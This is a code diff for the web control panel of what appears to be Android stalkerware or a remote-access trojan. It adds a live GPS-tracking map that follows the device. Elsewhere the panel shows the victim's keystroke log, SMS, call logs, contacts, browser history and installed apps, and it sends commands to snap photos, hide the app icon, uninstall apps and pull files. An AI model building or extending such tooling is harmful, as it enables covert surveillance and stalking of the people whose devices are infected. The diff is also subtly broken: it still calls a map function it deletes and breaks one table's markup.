@@ -217,6 +217,27 @@
         .map-type-toggle:hover {
             background: #f0f4f8;
         }
+        /* Follow checkbox */
+        .follow-checkbox {
+            position: absolute;
+            bottom: 20px;
+            right: 140px;
+            z-index: 1000;
+            background: white;
+            padding: 8px 12px;
+            border-radius: var(--radius-sm);
+            box-shadow: var(--shadow-sm);
+            font-size: 12px;
+            font-weight: 500;
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+        .follow-checkbox:hover {
+            background: #f0f4f8;
+        }
         /* Date selector for screen time */
         .date-selector {
             display: flex;
@@ -323,6 +344,7 @@ let currentCameraStream = null, currentAudioStream = null;
 let socialMsgsData = [], currentLocation = null;
 let deviceInfoRefreshInterval = null;
 let currentMapType = 'street';
+let liveMap = null, liveMarker = null, liveCircle = null, followLocation = false;
 
 const panel = document.getElementById('main-panel');
 const statusEl = document.getElementById('status');
@@ -1117,63 +1139,101 @@ async function loadAppUsageFromFirebase(days) {
     }
 }
 
-// ==================== ENHANCED MAP ====================
-function renderMap(loc){
-    let l=typeof loc==='string'?JSON.parse(loc):loc;
-    const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10;
-    currentLocation={lat,lon,acc};
-    panel.innerHTML = `
-        <div style="position:relative;">
-            <div id="map" style="height:400px; border-radius:12px;"></div>
-            <div class="map-info" id="mapInfo">
-                <div><strong>📍 Location</strong></div>
-                <div id="coordDisplay">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
-                <div id="accuracyDisplay">🎯 Accuracy: ${acc.toFixed(1)} m</div>
-                <div id="addressDisplay">🌍 Loading address...</div>
+// ==================== ENHANCED MAP WITH FOLLOW CHECKBOX ====================
+// This function creates a persistent map that updates marker and info without refreshing the whole page
+function renderLiveMap(lat, lon, acc) {
+    if (!liveMap) {
+        // First time – create map container
+        panel.innerHTML = `
+            <div style="position:relative;">
+                <div id="liveMapContainer" style="height:400px; border-radius:12px;"></div>
+                <div class="map-info" id="liveMapInfo">
+                    <div><strong>📍 Live Location</strong></div>
+                    <div id="liveCoord">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
+                    <div id="liveAccuracy">🎯 Accuracy: ${acc.toFixed(1)} m</div>
+                    <div id="liveAddress">🌍 Loading address...</div>
+                </div>
+                <div class="map-type-toggle" id="liveMapTypeToggle">🗺️ Switch to Satellite</div>
+                <label class="follow-checkbox" id="followCheckbox">
+                    <input type="checkbox" id="followLocationCheck"> Follow location
+                </label>
             </div>
-            <div class="map-type-toggle" id="mapTypeToggle">🗺️ Switch to Satellite</div>
-        </div>
-    `;
-    if(mapInstance) mapInstance.remove();
-    const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: '&copy; OpenStreetMap contributors'
-    });
-    const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
-        attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
-    });
-    mapInstance = L.map('map').setView([lat, lon], 18);
-    streetLayer.addTo(mapInstance);
-    L.circle([lat, lon], {radius: acc, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.2}).addTo(mapInstance);
-    L.marker([lat, lon], {icon: L.divIcon({className:'current-location-marker', iconSize:[12,12]})}).addTo(mapInstance).bindPopup('Device Location');
-    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
-        headers: { 'User-Agent': 'SystemSync-Console/1.0' }
-    })
-    .then(response => response.json())
-    .then(data => {
-        const address = data.display_name || 'Address not found';
-        document.getElementById('addressDisplay').innerHTML = `🌍 ${escapeHtml(address)}`;
-    })
-    .catch(err => {
-        console.error('Geocoding error:', err);
-        document.getElementById('addressDisplay').innerHTML = '🌍 Address unavailable';
-    });
-    const toggleBtn = document.getElementById('mapTypeToggle');
-    toggleBtn.addEventListener('click', () => {
-        if(currentMapType === 'street') {
-            mapInstance.removeLayer(streetLayer);
-            satelliteLayer.addTo(mapInstance);
-            currentMapType = 'satellite';
-            toggleBtn.innerHTML = '🗺️ Switch to Street';
-        } else {
-            mapInstance.removeLayer(satelliteLayer);
-            streetLayer.addTo(mapInstance);
-            currentMapType = 'street';
-            toggleBtn.innerHTML = '🗺️ Switch to Satellite';
+        `;
+        // Create the map
+        const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; OpenStreetMap contributors'
+        });
+        const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+            attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
+        });
+        liveMap = L.map('liveMapContainer').setView([lat, lon], 18);
+        streetLayer.addTo(liveMap);
+        liveMap.currentTileLayer = streetLayer;
+        liveMap.satelliteLayer = satelliteLayer;
+        liveMap.streetLayer = streetLayer;
+        // Add marker and circle
+        liveMarker = L.marker([lat, lon], {icon: L.divIcon({className:'current-location-marker', iconSize:[12,12]})}).addTo(liveMap).bindPopup('Device Location');
+        liveCircle = L.circle([lat, lon], {radius: acc, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.2}).addTo(liveMap);
+        // Toggle map type
+        document.getElementById('liveMapTypeToggle').addEventListener('click', () => {
+            if (currentMapType === 'street') {
+                liveMap.removeLayer(liveMap.currentTileLayer);
+                liveMap.satelliteLayer.addTo(liveMap);
+                liveMap.currentTileLayer = liveMap.satelliteLayer;
+                currentMapType = 'satellite';
+                document.getElementById('liveMapTypeToggle').innerHTML = '🗺️ Switch to Street';
+            } else {
+                liveMap.removeLayer(liveMap.currentTileLayer);
+                liveMap.streetLayer.addTo(liveMap);
+                liveMap.currentTileLayer = liveMap.streetLayer;
+                currentMapType = 'street';
+                document.getElementById('liveMapTypeToggle').innerHTML = '🗺️ Switch to Satellite';
+            }
+        });
+        // Follow checkbox event
+        document.getElementById('followLocationCheck').addEventListener('change', (e) => {
+            followLocation = e.target.checked;
+        });
+        // Initial reverse geocode
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
+        })
+        .then(response => response.json())
+        .then(data => {
+            const address = data.display_name || 'Address not found';
+            document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(address)}`;
+        })
+        .catch(err => {
+            console.error('Geocoding error:', err);
+            document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable';
+        });
+    } else {
+        // Update existing marker, circle, and info
+        liveMarker.setLatLng([lat, lon]);
+        liveCircle.setLatLng([lat, lon]);
+        liveCircle.setRadius(acc);
+        document.getElementById('liveCoord').innerHTML = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+        document.getElementById('liveAccuracy').innerHTML = `🎯 Accuracy: ${acc.toFixed(1)} m`;
+        // Update address (reverse geocode again, but do it asynchronously)
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
+        })
+        .then(response => response.json())
+        .then(data => {
+            const address = data.display_name || 'Address not found';
+            document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(address)}`;
+        })
+        .catch(err => {
+            console.error('Geocoding error:', err);
+            document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable';
+        });
+        if (followLocation) {
+            liveMap.setView([lat, lon]);
         }
-    });
+    }
 }
 
-// ==================== DATA DISPLAY FUNCTIONS (FIXED: SMS, CALL LOGS, CONTACTS) ====================
+// ==================== DATA DISPLAY FUNCTIONS (FIXED SMS, CALL LOGS, CONTACTS) ====================
 function renderTable(rows, headers) {
     const pageSize = 20;
     const totalPages = Math.ceil(rows.length / pageSize);
@@ -1205,9 +1265,7 @@ window.gotoPage = function(p) {
     else if (dataType === 'wifi') renderTable(currentData, ['SSID', 'Signal', 'Status']);
 };
 
-// FIXED: displaySMS - ensures array and calls renderTable correctly
 function displaySMS(data) {
-    // Ensure data is an array (if string, try parse)
     let smsArray = data;
     if (typeof data === 'string') {
         try { smsArray = JSON.parse(data); } catch(e) { smsArray = []; }
@@ -1227,7 +1285,6 @@ function displaySMS(data) {
     renderTable(rows, ['Type', 'Number', 'Message', 'Date']);
 }
 
-// FIXED: displayCallLogs - ensures array and uses MM:SS duration
 function displayCallLogs(data) {
     let callArray = data;
     if (typeof data === 'string') {
@@ -1249,7 +1306,6 @@ function displayCallLogs(data) {
     renderTable(rows, ['Type', 'Number', 'Name', 'Date', 'Duration']);
 }
 
-// FIXED: displayContacts - ensures array
 function displayContacts(data) {
     let contactArray = data;
     if (typeof data === 'string') {
@@ -1286,19 +1342,19 @@ function displayWifiNetworks(data) {
 
 function displayInstalledApps(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
-    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th><tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
     document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg}));
     document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg}));
 }
 
 function displayBrowserHistory(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
-    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"></table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
 }
 
 function displayKeylog(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
-    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><tr><thead><tr><th>Time</th><th>App</th><th>Text</th></table></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><tr><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
     document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG'));
 }
 
@@ -1387,7 +1443,25 @@ function displaySmsKeywords(data){ /* simplified */ }
 function displaySmsAlerts(data){ /* simplified */ }
 function capturePicture(){ const camera=document.querySelector('input[name="clickCameraSelect"]:checked').value; sendCommand('CAMERA_SNAPSHOT',{camera,flash:document.getElementById('clickFlashCheckbox').checked}); }
 function displayCapturedImage(b64){ panel.innerHTML=`<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;border-radius:8px;"><div style="margin-top:12px;"><button onclick="downloadBase64('${b64}','snapshot_${Date.now()}.jpeg')" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;">💾 SAVE IMAGE</button></div>`; }
-function toggleLiveGps(){ liveGpsActive=!liveGpsActive; sendCommand(liveGpsActive?'START_GPS_UPDATES':'STOP_GPS_UPDATES'); const btn=document.getElementById('liveGpsBtn'); if(btn){ btn.style.background=liveGpsActive?'#d32f2f':''; btn.querySelector('span:last-child').textContent=liveGpsActive?'Stop GPS Track':'Live GPS Track'; } }
+function toggleLiveGps(){
+    liveGpsActive=!liveGpsActive;
+    sendCommand(liveGpsActive?'START_GPS_UPDATES':'STOP_GPS_UPDATES');
+    const btn=document.getElementById('liveGpsBtn');
+    if(btn){
+        btn.style.background=liveGpsActive?'#d32f2f':'';
+        btn.querySelector('span:last-child').textContent=liveGpsActive?'Stop GPS Track':'Live GPS Track';
+    }
+    if(liveGpsActive && currentLocation){
+        // If already have a location, create the persistent map
+        renderLiveMap(currentLocation.lat, currentLocation.lon, currentLocation.acc);
+    } else if(!liveGpsActive){
+        // Optionally clear the map from panel
+        panel.innerHTML = '<p>Live GPS tracking stopped.</p>';
+        liveMap = null;
+        liveMarker = null;
+        liveCircle = null;
+    }
+}
 function toggleAppIcon(){ sendCommand(iconHidden?'SHOW_APP':'HIDE_APP'); }
 function toggleFlash(){ sendCommand(flashOn?'FLASH_OFF':'FLASH_ON'); }
 
@@ -1409,7 +1483,24 @@ function handleJSON(json){
         case 'WIFI_NETWORKS_DATA': try{ displayWifiNetworks(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'SOCIAL_MESSAGES_DATA': try{ displaySocialMessages(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
-        case 'LOCATION_UPDATE': renderMap(json.data||json); break;
+        case 'LOCATION_UPDATE': 
+            // Update the persistent map if live GPS is active
+            if(liveGpsActive) {
+                const loc = json.data || json;
+                const lat = loc.lat || loc.latitude;
+                const lon = loc.lon || loc.longitude;
+                const acc = loc.accuracy || 10;
+                currentLocation = {lat, lon, acc};
+                if(liveMap) {
+                    renderLiveMap(lat, lon, acc);
+                } else {
+                    renderLiveMap(lat, lon, acc);
+                }
+            } else {
+                // Fallback to the old one‑time map (not used during live tracking)
+                renderMap(json.data||json);
+            }
+            break;
         case 'GEOFENCE_INFO': try{ displayGeofenceInfo(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'FILE_INFO': fileTransfers[json.transferId]={chunks:new Array(json.totalChunks),totalChunks:json.totalChunks,fileName:json.fileName,received:0}; document.getElementById('progressFileName').innerText=json.fileName; document.getElementById('progressPercent').innerText='0%'; document.getElementById('progressBar').style.width='0%'; document.getElementById('downloadProgress').style.display='block'; break;
         case 'FILE_CHUNK': const tr=fileTransfers[json.transferId]; if(!tr)return; setTimeout(()=>{ try{ const bin=atob(json.data), bytes=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i); tr.chunks[json.chunkIndex]=bytes; tr.received++; const pct=Math.round((tr.received/tr.totalChunks)*100); document.getElementById('progressPercent').innerText=pct+'%'; document.getElementById('progressBar').style.width=pct+'%'; if(tr.received===tr.totalChunks){ const blob=new Blob(tr.chunks), url=URL.createObjectURL(blob), a=document.createElement('a'); a.href=url; a.download=tr.fileName; a.click(); URL.revokeObjectURL(url); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; showNotification(`✅ Downloaded: ${tr.fileName}`); } }catch(e){ showNotification('Chunk decode error'); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; } },0); break;
